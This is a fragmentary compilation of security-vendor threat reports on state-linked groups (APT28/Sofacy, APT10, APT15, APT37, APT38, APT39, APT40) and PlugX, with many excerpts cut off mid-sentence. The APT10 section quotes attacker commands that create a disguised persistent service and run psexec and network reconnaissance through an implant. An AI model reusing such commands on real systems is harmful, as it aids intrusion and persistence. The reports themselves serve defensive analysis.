"Retrieved May 07, 2019", "Article Content Introduction The Sofacy group, also known as APT28 and Sednit, is a fairly well known cyber espionage group believed to have ties to Russia Their targets have spanned all across the world, with a focus on government, defense organizations and various Eastern European governments There have been numerous reports on their activities, to the extent that a Wikipedia entry has even been created for them The Linux malware Fysbis is a preferred tool of Sofacy, and though it is not particularly sophisticated, Linux security in general is still a maturing area, especially in regards to malware In short, it is entirely plausible that this tool has contributed to the success of associated attacks by this group This blog post focuses specifically on this Linux tool preferred by Sofacy and describes considerations and implications when it comes to Linux malware Malware Assessment Fysbis is a modular Linux trojan / backdoor that implements plug-in and controller modules as distinct classes For reference, some vendors categorize this malware under the Sednit attacker group naming designation This malware includes both 32-bit and 64-bit versions of Executable and Linking Format (ELF) binaries Additionally, Fysbis can install itself to a victim system with or without root privileges This increases the options available to an adversary when it comes to selecting accounts for installation They epitomize the grudging reality that Advanced Persistent Threat (APT) actors often don\u2019t require advanced means to affect their objectives Rather, these actors more often than not hold their advanced malware and zero day exploits in reserve and employ just enough resources to meet their goals It is only fair that defenders use any shortcuts or tricks at their disposal to shorten the amount of time it takes to assess threats In other words, defenders should always look for ways to work smarter before they have to work harder Getting the Most Out of Strings Binary strings alone revealed a good amount about these files, increasing the efficacy of activities such as static analysis categorization (e.g., Yara) One example of this is Fysbis installation and platform targeting information for the samples in Table 1 and Table 2 Figure 1: Sofacy Fysbis installation and platform targeting found in strings In this case, we can see the binary installation path and local reconnaissance to determine which flavor of Linux the malware is running Another example of easily obtained information from these samples is capability based In addition to contributing to static analysis detections, this can be useful as a starting point for further incident response prioritization and qualification of the threat Symbolic Information Can Shorten Analysis Time Interestingly, the most recent ELF 64-bit binary we analyzed (Table 3) was not stripped prior to delivery, which offered additional context in the form of symbolic information Defenders more familiar with Windows Portable Executable (PE) binaries can equate this with compilation of a Debug version versus a Release version Additionally, this latest sample demonstrated minor evolution of the threat, most notably in terms of obfuscation Specifically, both samples in Table 1 and Table 2 leaked installation information in the clear within binary strings This was not the case with the sample in Table 3 Taking a closer look at this non-stripped binary using a disassembler, the following corresponds to decoding malware installation information for a root-privilege account Figure 5: Assembly code view of Sample 3 installation decoding In this case, the symbolic information hints at the method used for decoding, with references to mask, path, name, and info byte arrays Corresponding INSTALLUSER byte arrays exist, which facilitate the non-root installation for the trojan The same masking method is also used by the binary to decode malware configuration C2 information, further showcasing how a little symbolic information can go a long way towards completeness and higher confidence in assessment of a malware sample If you would like to learn more about how Fysbis works, the samples analyzed remain fairly consistent with the sample analysis found here Infrastructure Analysis As Unit 42 has discussed in depth in other blog articles, we have observed that adversaries in general are seemingly hesitant in changing their infrastructure This may be due to not wanting to commit additional resources, or simply a matter of retaining familiarity for the sake of timeliness In either case, we see the same type of behavior here with the Fysbis samples in use by Sofacy The oldest sample (Table 1), was found to beacon to the domain azureon-line[.]com, which had already been widely publicized as a known command and control domain for the Sofacy group Using passive DNS, we can see that two of the original IPs this domain resolved to, 193.169.244[.]190 and 111.90.148[.]148 also mapped to a number of other domains that had been in use by the Sofacy group during that time period Figure 7: Sample 1 C2 resolutions The first of the newer samples (Table 2), continues the trend and beacons to an IP also widely associated with the Sofacy group, 198.105.125[.]74 This IP has been mostly associated with the tool specifically known as CHOPSTICK, which can be read about here Figure 8: Sample 2 C2 resolutions The newest sample (Table 3), introduces a previously unknown command and control beacon to mozilla-plugins[.]com This activity aligns with the previously observed Sofacy group tactic of integrating legitimate company references into their infrastructure naming convention Comparing this sample\u2019s binary with the other two however, shows there are significant similarities on the code level as well as in terms of shared behavior Figure 9: Sample 3 C2 resolutions Conclusion Linux is used across business and home environments and appears in a variety of form factors Linux is also at the foundation of Android devices and a number of other embedded systems The value proposition of Linux \u2013 especially when it comes to its use in the enterprise \u2013 can be broken out into three perceived benefits: lower total cost of ownership (TCO), security, and feature set While numbers and comparison alone can contribute to measurement of TCO and feature set, security requires further qualification Expertise in the Linux platform is highly sought after across all industries for multiple disciplines, from system administration to big data analytics to incident response This means, from a practical perspective, most of a business\u2019s focus remains on supporting and protecting Windows assets Linux remains a mystery to a number of enterprise IT specialists \u2013most critically for network defenders Identifying and qualifying potential incidents requires a familiarity with what constitutes normal operation in order to isolate anomalies The same is true for any other asset in an environment, normal operation is entirely dependent on a given asset\u2019s role / function in the enterprise Lack of expertise and visibility into non-Windows platforms combine in some environments to present significant risks against an organization\u2019s security posture As a recent caution, the Linux vulnerability described under CVE-2016-0728 further demonstrates the potential breadth of real-world risks to associated platforms A natural extension of this exposure is increased targeting by both dedicated and opportunistic attackers across various malicious actor motivations Despite the lingering belief (and false sense of security) that Linux inherently yields higher degrees of protection from malicious actors, Linux malware and vulnerabilities do exist and are in use by advanced adversaries To mitigate associated risks requires tailored integration of the people, processes, and technology in support of prevention, monitoring, and detection within an environment", "\u671d\u9577 \u79c0\u8aa0 (Shusei Tomonaga)", "April 19, 2019", "Analysis of a Recent PlugX Variant - \u201cP2P

Various sectors in Japan have been suffering from this type of attack from 2012, and Analysis Center has been working to catch up on the evolution of the PlugX family since then In this blog post, I will write about a recent PlugX variant which we first encountered in October 2014 The variant has interesting new aspects and the most significant one, in my view, is the P2P function - so let me tentatively name it \u201cP2P PlugX\u201d Our analysis revealed that the size of the configuration information has been expanded for the recent variant While the former ones have either 0x2540 bytes (Observed since August 2013) or 0x2d58 bytes (Observed since June 2014), the recent one has 0x36a4 bytes, roughly 20% larger in size I will pick up some of the interesting features for more description For details of the configuration file, you can refer to Appendix A in the bottom of this post Additional Communication Protocol for C&C Servers Former versions of PlugX used to set four C&C Server addresses to communicate with With the P2P PlugX, attackers can set up to 16 C&C servers Communication protocol with C&C servers has also been improved Former PlugX could only configure four communication protocols, but for P2P PlugX, protocol number 255 became available This protocol is reserved by IANA, but no specific application is assigned Table 1: Configurations and

to any other TCP/UDP ports But in cases which JPCERT/CC ha\uff53 observed, P2P PlugX only uses either TCP/1357 or UDP/1357 for P2P communication If you see any scanning activity to TCP/1357 or UDP/1357, we highly recommend that you conduct further investigation New Encoding Algorithm PlugX uses a single encoding algorithm for inbound/outbound data, configuration, key logging data and strings used internally Likewise, P2P PlugX has a new encoding algorithm def plugx_decode(data):     decode_key = struct.unpack_from('<I', data, 0)[0]     out = ''          # XOR Values might possibly

APT10 Background APT10 (MenuPass Group) is a Chinese cyber espionage group that FireEye has tracked since 2009 They have historically targeted construction and engineering, aerospace, and telecom firms, and governments in the United States, Europe, and Japan We believe that the targeting of these industries has been in support of Chinese national security goals, including acquiring valuable military and intelligence information as well as the theft of confidential business data to support Chinese corporations PwC and BAE recently issued a joint blog detailing extensive APT10 activity APT10\u2019s Resurgence In June 2016, FireEye iSIGHT intelligence first reported that APT10 expanded their operations The group was initially detected targeting a Japanese university, and more widespread targeting in Japan was subsequently uncovered Global Targeting Using New Tools Leveraging its global footprint, FireEye has detected APT10 activity across six continents in 2016 and 2017 APT10 has targeted or compromised manufacturing companies in India, Japan and Northern Europe; a mining company in South America; and multiple IT service providers worldwide We believe these companies are a mix of final targets and organizations that could provide a foothold in a final target APT10 unveiled new tools in its 2016/2017 activity In addition to the continued use of SOGU, the current wave of intrusions has involved new tools we believe are unique to APT10 HAYMAKER and SNUGRIDE have been used as first stage backdoors, while BUGJUICE and a customized version of the open source QUASARRAT have been used as second stage backdoors These new pieces of malware show that APT10 is devoting resources to capability development and innovation It also conducts basic victim profiling activity, collecting the computer name, running process IDs, %TEMP% directory path and version of Internet Explorer QUASARRAT is an open-source RAT available here The versions used by APT10 (1.3.4.0, 2.0.0.0, and 2.0.0.1) are not available via the public GitHub page, indicating that APT10 has further customized the open source version QUASARRAT is a fully functional .NET backdoor that has been used by multiple cyber espionage groups in the past Traditional and Novel Methods This recent APT10 activity has included both traditional spear phishing and access to victim\u2019s networks through service providers (For more information on infection via service providers see M-Trends 2016) \u201c[Redacted]_Group_Meeting_Document_20170222_doc_.exe) and in some cases simply identically named decoy documents and malicious launchers within the same archive In addition to the spear phishes, FireEye ISIGHT Intelligence has observed APT10 accessing victims through global service providers A notable instance of this observed by FireEye involved a SOGU backdoor that was set to communicate with its C2 through a server belonging to the victim\u2019s service provider APT10 actors issued the following commands to a SOGU implant at a victim:  sc create CorWrTool binPath= \"\\\"C:\\Windows\\vss\\vixDiskMountServer.exe\\\"\" start= auto displayname= \"Corel Writing Tools Utility\" type= own sc description CorWrTool \"Corel Graphics Corporation Applications.\" ping -a [Redacted] psexec.exe <orghost> d.exe net view /domain:[Redacted] proxyconnect - \"port\": 3389, \"server\": \"[IP Address Redacted]\"  These commands included setting persistence on the victim\u2019s system The actor then tested connectivity to an IP managed by the victim\u2019s service provider Implications APT10 is a threat to organizations worldwide Their abuse of access to service provider networks demonstrates that peripheral organizations continue to be of interest to a malicious actor \u2013 especially those seeking alternative angles of attack We believe the pace of APT10 operations may slow following the public disclosure by the PwC/BAE blog; however, we believe they will return to their large-scale operations, potentially employing new tactics, techniques and procedures.", "Ayako Matsuda", "September 13, 2018", "APT10 Targeting Japanese Corporations Using Updated TTPs", "Retrieved May 07,

available online It\u2019s also worth noting that in the Guatemalan lure, the attacker used an unusual spelling of Guatemala in Japanese The top result of a Google search using the same spelling led us to the event website for the lecture of the Guatemalan Ambassador, held in August 2018 Figure 1 shows the screenshot of the event page Figure 1: Event Website for the Lecture of Guatemala

people who would have an interest in Latin American issues may have been the targets of this campaign Figure 2: Macro to display lure document The initial Word documents were password protected, likely in an effort to bypass detection Figure 3: Lure document Figure 4 shows what happens when the malicious macro is executed Figure 4: Macro to install UPPERCUT The execution workflow is as follows: 1.\u00a0\u00a0\u00a0\u00a0 The macro drops three PEM files, padre1.txt, padre2.txt, and padre3.txt, to the victim\u2019s %TEMP% folder and then copies them from %TEMP% to the %AllUserProfile% folder libcurl.dll:\u00a0Malicious Loader DLL 3F2E3AB9:\u00a0Encrypted shellcode     Figure 5: Notepad++ signed updater 4.\u00a0\u00a0\u00a0\u00a0 The macro launches the legitimate executable GUP.exe The executable sideloads the malicious DLL (libcurl.dll), which decrypts and runs shellcode (3F2E3AB9) located in the same folder Before decoding the DLL, the shellcode uses an anti-debug technique based on ntdll_NtSetInformationThread which causes the thread to be detached from the debugger, as shown in Figure 6 The DLL is then loaded into memory and the randomly named exported function is called Figure 6: Anti-debug technique used by shellcode 5.\u00a0\u00a0\u00a0\u00a0 The macro deletes the initially dropped .txt files using Windows esentutl.exe and changes the document text to an embedded message The complete attack overview is shown in Figure 7 Figure 7: Attack overview Several threat actors leverage the technique of using Windows certutil.exe for payload decoding, and APT10 continues to employ this technique Evolution of UPPERCUT Figure 8 shows the timeline of updates for UPPERCUT The compile time of loaders in the newer version(s) are not shown here since the timestamps are overwritten and filled with zeroes We don\u2019t have visibility into UPPERCUT 5.2.x series, but it\u2019s possible that minor revisions were released every few months between December 2017 and May 2018 Figure 8: Timeline of UPPERCUT updates Unlike previous versions, the exported function names are randomized in the latest version (Table 2) The error code is the value returned by the GetLastError function and sent in the next beacon This was likely included to help the attackers understand the problem if the backdoor is unable to receive a response (Figure 9) This Cookie header is a unique indicator that can be used for network-based detection However, in the latest version, the keys are hard-coded uniquely for each C2 address and use the C2\u2019s calculated MD5 hash to determine which key to use, as shown in Figure 10 Figure 10: Blowfish key generation For instance, Table 3\u00a0lists the hard-coded C2 addresses, their MD5 hash, and the corresponding Blowfish key in

newer versions of UPPERCUT, there is a significant change in the way backdoor initializes the Blowfish encryption key, which makes it harder for analysts to detect and decrypt the backdoor\u2019s network communications This shows that APT10 is very capable of maintaining and updating their malware To mitigate the threat, users are advised to disable Office macros in their settings and not to

provides a range of services to UK Government, suffered a network compromise involving the advanced persistent threat group APT15 APT15 is also known as, Ke3chang, Mirage, Vixen Panda GREF and Playful Dragon A number of sensitive documents were stolen by the attackers during the incident and we believe APT15 was targeting information related to UK government departments and military technology APT15 expands its arsenal During our analysis of the compromise, we identified new backdoors that now appear to be part of APT15's toolset The backdoor BS2005 - which has traditionally been used by the group - now appears alongside the additional backdoors RoyalCli and RoyalDNS The RoyalCli backdoor appears to be an evolution of BS2005 and uses familiar encryption and encoding routines The name RoyalCli was chosen by us due to a debugging path left in the binary: c:\\users\\wizard\\documents\\visual studio 2010\\Projects\\RoyalCli\\Release\\RoyalCli.pdb RoyalCli and BS2005 both communicate with the attacker's command and control (C2) through Internet Explorer (IE) by using the COM interface IWebBrowser2 Due to the nature of the technique, this results in C2 data being cached to disk by the IE process; we'll get to this later This was achieved through the use of a simple Windows run key We believe that APT15 could have employed this technique in order to evade behavioural detection, rather than due to a lack of sophistication or development capability spwebmember was written in Microsoft .NET and includes hardcoded values for client project names for data extraction The group also used keyloggers and their own .NET tool to enumerate folders and dump data from Microsoft Exchange mailboxes This allowed the group to persist in the victim's network in the event of remediation actions being undertaken, such as a password reset APT15 lives off the land Upon ejection from the network, APT15 managed to regain access a couple of weeks later via the corporate VPN solution with a stolen VPN certificate, which they had extracted from a compromised host This time, APT15 opted for a DNS based backdoor: RoyalDNS The persistence mechanism used by RoyalDNS was achieved through a service called 'Nwsapagent' C2 of this backdoor was performed using the TXT record of the DNS protocol C2 was communicating with the domain 'andspurs[.]com' We were able to recover these files and reverse engineer the encoding routine used by the backdoors in order to uncover the exact commands executed by the attacker In total, we were able to recover more than 200 commands executed by the attacker against the compromised hosts and were able to gain a clear insight into the attacker's TTPs Our decode scripts can be found on our Github page:\u00a0https://github.com/nccgroup/Royal_APT Analysis of the commands executed by APT15 reaffirmed the group's preference to 'live off the land' Lateral movement was conducted through by a combination of net command, mounting the C$ share of hosts and manually copying files to or from compromised hosts APT15 then used a tool known as RemoteExec (similar to Microsoft's Psexec) in order to remotely execute batch scripts and binaries During our analysis of the decoded attacker commands we noticed a typographical mistake, shown below in the folder name 'systme' IOCs Below are a number of hashes relating to the backdoors identified in use

nation-state actors in cyber attacks was perhaps most widely revealed in February 2013 when Mandiant released the APT1 report, which detailed a professional cyber espionage group based in China Today we release a new report: APT28: A Window Into Russia\u2019s Cyber Espionage Operations? This report focuses on a threat group that we have designated as APT28 While APT28\u2019s malware is fairly well known in the cybersecurity community, our report details additional information exposing ongoing, focused operations that we believe indicate a government sponsor based in Moscow In contrast with the China-based threat actors that FireEye tracks, APT28 does not appear to conduct widespread intellectual property theft for economic gain Instead, APT28 focuses on collecting intelligence that would be most useful to a government Specifically, FireEye found that since at least 2007, APT28 has been targeting privileged information related to governments, militaries and security organizations that would likely benefit the Russian government In our report, we also describe several malware samples containing details that indicate that the developers are Russian language speakers operating during business hours that are consistent with the time zone of Russia\u2019s major cities, including Moscow and St Petersburg FireEye analysts also found that APT28 has systematically evolved its malware since 2007, using flexible and lasting platforms indicative of plans for long-term use and sophisticated coding practices that suggest an interest in complicating reverse engineering efforts We assess that APT28 is most likely sponsored by the Russian government based on numerous factors summarized below:  FireEye is also releasing indicators to help organizations detect APT28 activity Those indicators can be downloaded at https://github.com/fireeye/iocs As with the APT1 report, we recognize that no single entity completely understands the entire complex picture of intense cyber espionage over many years Our goal by releasing this report is to offer an assessment that informs and educates the community about attacks originating from Russia The complete report can be downloaded here: http://www.fireeye.com/resources/pdfs/apt28.pdf.", "Lindsay Smith", "August 11, 2017", "APT28 Targets Hospitality Sector, Presents Threat to Travelers", "Retrieved May 07, 2019.\nLindsay Smith", "August 11, 2017", "APT28 Targets Hospitality Sector, Presents Threat to Travelers", "Retrieved May 07, 2019", "Article Content FireEye has moderate confidence that a campaign targeting the hospitality sector is attributed to Russian actor APT28 We believe this activity, which dates back to at least July 2017, was intended to target travelers to hotels throughout Europe and the Middle East The malicious document \u2013 Hotel_Reservation_Form.doc (MD5: 9b10685b774a783eabfecdb6119a8aa3), as seen in Figure 1 \u2013 contains a macro that base64 decodes a dropper that then deploys APT28\u2019s signature GAMEFISH malware (MD5: 1421419d1be31f1f9ea60e8ed87277db), which uses mvband.net and mvtband.net as command and control (C2) domains Figure 1: Hotel_Reservation_Form.doc (MD5: 9b10685b774a783eabfecdb6119a8aa3) APT28 Uses Novel Techniques to Move Laterally and Potentially Target Travelers APT28 is using novel techniques involving the EternalBlue exploit and the open source tool Responder to spread laterally through networks and likely target travelers Responder facilitates NetBIOS Name Service (NBT-NS) poisoning This technique listens for NBT-NS (UDP/137) broadcasts from victim computers attempting to connect to network resources Once received, Responder masquerades as the sought-out resource and causes the victim computer to send the username and hashed password to the attacker-controlled machine APT28 used this technique to steal usernames and hashed passwords that allowed escalation of privileges in the victim network To spread through the hospitality company\u2019s network, APT28 used a version of the EternalBlue SMB exploit This was combined with the heavy use of py2exe to compile Python scripts This is the first time we have seen APT28 incorporate this exploit into their intrusions In the 2016 incident, the victim was compromised after connecting to a hotel Wi-Fi network Twelve hours after the victim initially connected to the publicly available Wi-Fi network, APT28 logged into the machine with stolen credentials These 12 hours could have been used to crack a hashed password offline After successfully accessing the machine, the attacker deployed tools on the machine, spread laterally through the victim's network, and accessed the victim's OWA account The login originated from a computer on the same subnet, indicating that the attacker machine was physically close to the victim and on the same Wi-Fi network We cannot confirm how the initial credentials were stolen in the 2016 incident; however, later in the intrusion, Responder was deployed Since this tool allows an attacker to sniff passwords from network traffic, it could have been used on the hotel Wi-Fi network to obtain a user\u2019s credentials Long-Standing Threats to Travelers Cyber espionage activity against the hospitality industry is typically focused on collecting information on or from hotel guests of interest rather than on the hotel industry itself, though actors may also collect information on the hotel as a means of facilitating operations APT28 isn\u2019t the only group targeting travelers South Korea-nexus Fallout Team (aka Darkhotel) has used spoofed software updates on infected Wi-Fi networks in Asian hotels, and Duqu 2.0 malware has been found on the networks of European hotels used by participants in the Iranian nuclear negotiations Additionally, open sources have reported for several years that in Russia and China, high-profile hotel guests may expect their hotel rooms to be accessed and their laptops and other electronic devices accessed Outlook and Implications These incidents show a novel infection vector being used by APT28 The group is leveraging less secure hotel Wi-Fi networks to steal credentials and a NetBIOS Name Service poisoning utility to escalate privileges APT28\u2019s already wide-ranging capabilities and tactics are continuing to grow and refine as the group expands its infection vectors Travelers must be aware of the threats posed when traveling \u2013 especially to foreign countries \u2013 and take extra precautions to secure their systems and data Publicly accessible Wi-Fi networks present a significant threat and should be avoided whenever possible Additional technical information and details are available to FireEye iSIGHT Intelligence customers through our portal.", "FireEye", "February 20, 2018", "APT37 (Reaper): The Overlooked North Korean Actor", "Retrieved May 07, 2019.\nFireEye", "February 20, 2018", "APT37 (Reaper): The Overlooked North Korean Actor", "Retrieved May 07, 2019", "Article Content On Feb Our analysis of APT37\u2019s recent activity reveals that the group\u2019s operations are expanding in scope and sophistication, with a toolset that includes access to zero-day vulnerabilities and wiper malware We assess with high confidence that this activity is carried out on behalf of the North Korean government given malware development artifacts and targeting that aligns with North Korean state interests FireEye iSIGHT Intelligence believes that APT37 is aligned with the activity publicly reported as\u00a0Scarcruft and Group123 Read our report,  APT37 (Reaper): The Overlooked North Korean Actor, to learn more about our assessment that this threat actor is working on behalf of the North Korean government, as well as various other details about their operations:   Targeting: Primarily South Korea \u2013 though also Japan, Vietnam and the Middle East \u2013 in various industry verticals, including chemicals, electronics, manufacturing, aerospace, automotive, and healthcare Initial Infection Tactics: Social engineering tactics tailored specifically to desired targets, strategic web compromises typical of targeted cyber espionage operations, and the use of torrent file-sharing sites to distribute malware more indiscriminately The group has demonstrated access to zero-day vulnerabilities (CVE-2018-0802), and the ability to incorporate them into operations The group has shown increasing sophistication by improving their operational security over time Malware: A diverse suite of malware for initial intrusion and exfiltration Along with custom malware used for espionage purposes, APT37 also has access to destructive malware More information on this threat actor is found in our report,  APT37 (Reaper): The Overlooked North Korean Actor You can also register for our upcoming webinar for additional insights into this group.", "Nalani Fraser", "October 03, 2018", "APT38: Details on New North Korean Regime-Backed Threat Group", "Retrieved May 07, 2019.\nNalani Fraser", "October 03, 2018", "APT38: Details on New North Korean Regime-Backed Threat Group", "Retrieved May 07, 2019", "Article Content Today, we are releasing details on the threat group that we believe is responsible for conducting financial crime on behalf of the North Korean regime, stealing millions of dollars from banks worldwide The group is particularly aggressive; they regularly use destructive malware to render victim networks inoperable following theft More importantly, diplomatic efforts, including the recent Department of Justice (DOJ) complaint that outlined attribution to North Korea, have thus far failed to put an end to their activity We are calling this group APT38 We are releasing a special report, APT38: Un-usual Suspects, to expose the methods used by this active and serious threat, and to complement earlier efforts by others to expose these operations, using FireEye\u2019s unique insight into the attacker lifecycle We believe APT38\u2019s financial motivation, unique toolset, and tactics, techniques and procedures (TTPs) observed during their carefully executed operations are distinct enough to be tracked separately from other North Korean cyber activity There are many overlapping characteristics with other operations, known as \u201cLazarus\u201d and the actor we call TEMP.Hermit; however, we believe separating this group will provide defenders with a more focused understanding of the adversary and allow them to prioritize resources and enable defense The following are some of the ways APT38 is different from other North Korean actors, and some of the ways they are similar:  We find there are clear distinctions between APT38 activity and the activity of other North Korean actors, including the actor we call TEMP.Hermit Our investigation indicates they are disparate operations against different targets and reliance on distinct TTPs; however, the malware tools being used either overlap or exhibit shared characteristics, indicating a shared developer or access to the same code repositories As evident in the DOJ complaint, there are other shared resources, such as personnel who may be assisting multiple efforts This report detailed malware and TTPs related to a set of developers and operators they dubbed \u201cLazarus,\u201d a name that has become synonymous with aggressive North Korean cyber operations Since then, public reporting attributed additional activity to the \u201cLazarus\u201d group with varying levels of confidence primarily based on malware similarities being leveraged in identified operations Over time, these malware similarities diverged, as did targeting, intended outcomes and TTPs, almost certainly indicating that this activity is made up of multiple operational groups primarily linked together with shared malware development resources and North Korean state sponsorship Since at least 2014, APT38 has conducted operations in more than 16 organizations in at least 13 countries, sometimes simultaneously, indicating that the group is a large, prolific operation with extensive resources The following are some details about APT38 targeting:  The total number of organizations targeted by APT38 may be even higher when considering the probable low incident reporting rate from affected organizations The group is careful, calculated, and has demonstrated a desire to maintain access to a victim environment for as long as necessary to understand the network layout, required permissions, and system technologies to achieve its goals On average, we have observed APT38 remain within a victim network for approximately 155 days, with the longest time within a compromised environment believed to be almost two years In just the publicly reported heists alone, APT38 has attempted to steal over $1.1 billion dollars from financial institutions Investigating intrusions of many victimized organizations has provided us with a unique perspective into APT38\u2019s entire attack lifecycle Figure 1 contains a breakdown of observed malware families used by APT38 during the different stages of their operations At no point did we observe these actors breach the integrity of the SWIFT system itself.) Initial Compromise: Relied on watering holes and exploited an insecure out-of-date version of Apache Struts2 to execute code on a system Internal Reconnaissance: Deployed malware to gather credentials, mapped the victim\u2019s network topology, and used tools already present in the victim environment to scan systems Pivot to Victim Servers Used for SWIFT Transactions: Installed reconnaissance malware and internal network monitoring tools on systems used for SWIFT to further understand how they are configured and being used Deployed both active and passive backdoors on these systems to access segmented internal systems at a victim organization and avoid detection Transfer funds: Deployed and executed malware to insert fraudulent SWIFT transactions and alter transaction history Transferred funds via multiple transactions to accounts set up in other banks, usually located in separate countries to enable money laundering Figure 1: APT38 Attack Lifecycle APT38 is unique in that it is not afraid to aggressively destroy evidence or victim networks as part of its operations This attitude toward destruction is probably a result of the group trying to not only cover its tracks, but also to provide cover for money laundering operations In addition to cyber operations, public reporting has detailed recruitment and cooperation of individuals in-country to support with the tail end of APT38\u2019s thefts, including persons responsible for laundering funds and interacting with recipient banks of stolen funds This adds to the complexity and necessary coordination amongst multiple components supporting APT38 operations Despite recent efforts to curtail their activity, APT38 remains active and dangerous to financial institutions worldwide By conservative estimates, this actor has stolen over a hundred million dollars, which would be a major return on the likely investment necessary to orchestrate these operations Furthermore, given the sheer scale of the thefts they attempt, and their penchant for destroying targeted networks, APT38 should be considered a serious risk to the sector.", "Sarah Hawley", "January 29, 2019", "APT39: An Iranian Cyber

07, 2019", "Article Content UPDATE (Jan 30): Figure 1 has been updated to more accurately reflect APT39 targeting Specifically, Australia, Norway and South Korea have been removed In December 2018, FireEye identified APT39 as an Iranian cyber espionage group responsible for widespread theft of personal information We have tracked activity linked to this group since November 2014 in order to protect organizations from APT39 activity to date APT39\u2019s focus on the widespread theft of personal information sets it apart from other Iranian groups FireEye tracks, which have been linked to influence operations, disruptive attacks, and other threats APT39 likely focuses on personal information to support monitoring, tracking, or surveillance operations that serve Iran\u2019s national priorities, or potentially to create additional accesses and vectors to facilitate future campaigns.\u00a0 APT39 was created to bring together previous activities and methods used by this actor, and its activities largely align with a group publicly referred to as \"Chafer.\" However, there are differences in what has been publicly reported due to the variances in how organizations track activity APT39 primarily leverages the SEAWEED and CACHEMONEY backdoors along with a specific variant of the POWBAT backdoor While APT39's targeting scope is global, its activities are concentrated in the Middle East APT39 has prioritized the telecommunications sector, with additional targeting of the travel industry and IT firms that support it and the high-tech industry.\u00a0The countries and industries targeted by APT39 are depicted in Figure 1 Figure 1:\u00a0Countries and industries targeted by APT39 Operational Intent APT39's focus on the telecommunications and travel industries suggests intent to perform monitoring, tracking, or surveillance operations against specific individuals, collect proprietary or customer data for commercial or operational purposes that serve strategic requirements related to national priorities, or create additional accesses and vectors to facilitate future campaigns Government entities targeting suggests a potential secondary intent to collect geopolitical data that may benefit nation-state decision making Targeting data supports the belief that APT39's key mission is to track or monitor targets of interest, collect personal information, including travel itineraries, and gather customer data from telecommunications firms Iran Nexus Indicators We have moderate confidence APT39 operations are conducted in support of Iranian national interests based on regional targeting patterns focused in the Middle East, infrastructure, timing, and similarities to APT34, a group that loosely aligns with activity publicly reported as \u201cOilRig\u201d While APT39 and APT34 share some similarities, including malware distribution methods, POWBAT backdoor use, infrastructure nomenclature, and targeting overlaps, we consider APT39 to be distinct from APT34 given its use of a different POWBAT variant It is possible that these groups work together or share resources at some level Attack Lifecycle APT39 uses a variety of custom and publicly available malware and tools at all stages of the attack lifecycle APT39 frequently registers and leverages domains that masquerade as legitimate web services and organizations that are relevant to the intended target Establish Foothold, Escalate Privileges, and Internal Reconnaissance Post-compromise, APT39 leverages custom backdoors such as SEAWEED, CACHEMONEY, and a unique variant of POWBAT to establish a foothold in a target environment Internal reconnaissance has been performed using custom scripts and both freely available and custom tools such as the port scanner, BLUETORCH Outlook We believe APT39's significant targeting of the telecommunications and travel industries reflects efforts to collect personal information on targets of interest and customer data for the purposes of surveillance to facilitate future operations Telecommunications firms are attractive targets given that they store large amounts of personal and customer information, provide access to critical infrastructure used for communications, and enable access to a wide range of potential targets across multiple verticals APT39's targeting not only represents a threat to known targeted industries, but it extends to these organizations' clientele, which includes a wide variety of sectors and individuals on a global scale APT39's activity showcases Iran's potential global operational reach and how it uses cyber operations as a low-cost and effective tool to facilitate the collection of key data on perceived national security threats and gain advantages against regional and global

actor we call APT40 The actor has conducted operations since at least 2013 in support of China\u2019s naval modernization effort The group has specifically targeted engineering, transportation, and the defense industry, especially where these sectors overlap with maritime technologies More recently, we have also observed specific targeting of countries strategically important to the Belt and Road Initiative including Cambodia, Belgium, Germany, Hong Kong, Philippines, Malaysia, Norway, Saudi Arabia, Switzerland, the United States, and the United Kingdom This China-nexus cyber espionage group was previously reported as TEMP.Periscope and TEMP.Jumper Mission In December 2016, China\u2019s People Liberation Army Navy (PLAN) seized a U.S Navy unmanned underwater vehicle (UUV) operating in the South China Sea The incident paralleled China\u2019s actions in cyberspace; within a year APT40 was observed masquerading as a UUV manufacturer, and targeting universities engaged in naval research That incident was one of many carried out to acquire advanced technology to support the development of Chinese naval capabilities We believe APT40\u2019s emphasis on maritime issues and naval technology ultimately support China\u2019s ambition to establish a blue-water navy In addition to its maritime focus, APT40 engages in broader regional targeting against traditional intelligence

moderate confidence that APT40 is a state-sponsored Chinese cyber espionage operation The actor\u2019s targeting is consistent with Chinese state interests and there are multiple technical artifacts indicating the actor is based in China Analysis of the operational times of the group\u2019s activities indicates that it is probably centered around China Standard Time (UTC +8) APT40 has also used multiple Internet Protocol (IP) addresses located in China to conduct its operations All of the logins to this C2 were from computers configured with Chinese language settings Depending on placement, a web shell can provide continued access to victims' environments, re-infect victim systems, and facilitate lateral movement The operation\u2019s spear-phishing emails typically leverage malicious attachments, although Google Drive links have also been observed In some cases, the group has used executables with code signing certificates to avoid detection First-stage backdoors such as AIRBREAK, FRESHAIR, and BEACON are used before downloading other payloads PHOTO, BADFLICK, and CHINA CHOPPER are among the most frequently observed backdoors used by APT40 APT40 will often target VPN and remote desktop credentials to establish a foothold in a targeted environment This methodology proves to be ideal as once these credentials are obtained, they may not need to rely as heavily on malware to continue the mission Additionally, the Windows Sysinternals ProcDump utility and Windows Credential Editor (WCE) are believed to be used during intrusions as well The group also leverages RDP, SSH, legitimate software within the victim environment, an array of native Windows capabilities, publicly available tools, as well as custom scripts to facilitate internal reconnaissance APT40 frequently uses native Windows commands, such as net.exe, to conduct internal reconnaissance of a victim\u2019s environment For each new system compromised, the group usually executes malware, performs additional reconnaissance, and steals data APT40 also uses native Windows utilities such as at.exe (a task scheduler) and net.exe (a network resources management tool) for lateral movement Publicly available tunneling tools are leveraged alongside distinct malware unique to the operation These tools enable continued control of key systems in the targeted network Tools used during the Establish Foothold phase also continue to be used in the Maintain Presence phase; this includes AIRBREAK and PHOTO Complete Mission Completing missions typically involves gathering and transferring information out of the target network, which may involve moving files through multiple systems before reaching the destination We have also observed APT40 develop tools such as PAPERPUSH to aid in the effectiveness of their data targeting and theft Outlook and Implications Despite increased public attention, APT40 continues to conduct cyber espionage operations following a regular tempo, and we anticipate their operations will continue through at least the near and medium term Based on APT40\u2019s broadening into election-related targets in 2017, we assess with moderate confidence that the group\u2019s future targeting will affect additional sectors beyond maritime, driven by events such as China\u2019s Belt and Road Initiative In particular, as individual Belt and Road projects unfold, we are likely to see continued activity by APT40 which extends against the project\u2019s regional opponents.", "Yin Hong Chang", "June 03, 2016", "APT Group Sends Spear Phishing Emails to Indian

